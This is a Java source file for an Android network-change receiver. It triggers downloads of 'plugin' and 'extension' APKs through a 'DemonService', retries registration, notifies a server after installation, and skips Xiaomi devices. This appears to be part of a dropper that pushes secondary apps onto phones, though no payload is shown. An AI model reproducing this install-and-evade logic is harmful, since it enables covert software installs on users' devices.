package com.xstd.qm.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.qm.AppRuntime;
import com.xstd.qm.Config;
import com.xstd.qm.ExtPluginUtils;
import com.xstd.qm.UtilOperator;
import com.xstd.qm.service.DemonService;
import com.xstd.qm.setting.SettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-14
 * Time: PM1:18
 * To change this template use File | Settings | File Templates.
 */
public class NetworkBroadcastReceiver extends BroadcastReceiver {

    public void onReceive(final Context context, Intent intent) {
        Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] Entry >>>>>>>>");

        if (AppRuntime.isXiaomiDevice()) {
            if (Config.DEBUG) {
                Config.LOGD("[[QuickSettingApplication::onCreate]] this device is Xiaomi Devices, just ignore this device");
            }
            return;
        }

        String path = SettingManager.getInstance().getLocalApkPath();

        String extPath = SettingManager.getInstance().getLocalExtApkPath();
        if (SettingManager.getInstance().getPluginInstallTime() >= 3
                && !SettingManager.getInstance().getKeyPluginInstalled()
                && UtilsRuntime.isOnline(context)
                && !TextUtils.isEmpty(extPath)
                && !Config.DOWNLOAD_EXT_PROCESS_RUNNING.get()
                && !ExtPluginUtils.isExtPluginApkExist()) {
            //在子程序安装三次以上就开始下载扩展子程序
            //只有在子程序没有安装成功的时候才下载
            Intent i = new Intent();
            i.setAction(DemonService.ACTION_DOWNLOAD_EXT_PLUGIN);
            context.startService(i);
        }

        if (!Config.THIRD_PART_PREVIEW
                && !SettingManager.getInstance().getKeyPluginInstalled()
                && UtilsRuntime.isOnline(context)
                && !TextUtils.isEmpty(path)
                && !Config.DOWNLOAD_PROCESS_RUNNING.get()
                && !UtilOperator.isPluginApkExist()) {
            //下载子程序
            Intent i = new Intent();
            i.setAction(PluginDownloadBroadcastReceiver.DOWNLOAD_PLUGIN_ACTION);
            context.sendBroadcast(i);
        } else if (TextUtils.isEmpty(path)) {
            if (Config.DEBUG) {
                Config.LOGD("[[QuickSettingApplication::onCreate]] notify Service Lanuch as the network changed ");
            }

            //如果下载路径是空的话，重新进行一次注册
            Intent i = new Intent();
            i.setClass(context, DemonService.class);
            i.setAction(DemonService.ACTION_LANUCH);
            context.startService(i);
        } else if (SettingManager.getInstance().getKeyPluginInstalled()
                     && UtilsRuntime.isOnline(context)
                     && !SettingManager.getInstance().getNotifyPluginInstallSuccess()) {
            //plugin已经安装，并且有网
            //通知服务器
            Intent i = new Intent();
            i.setClass(context, DemonService.class);
            i.setAction(DemonService.ACTION_INFO_NOTIFY);
            context.startService(i);
        }

        Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] Leave <<<<<<<<");
    }

}
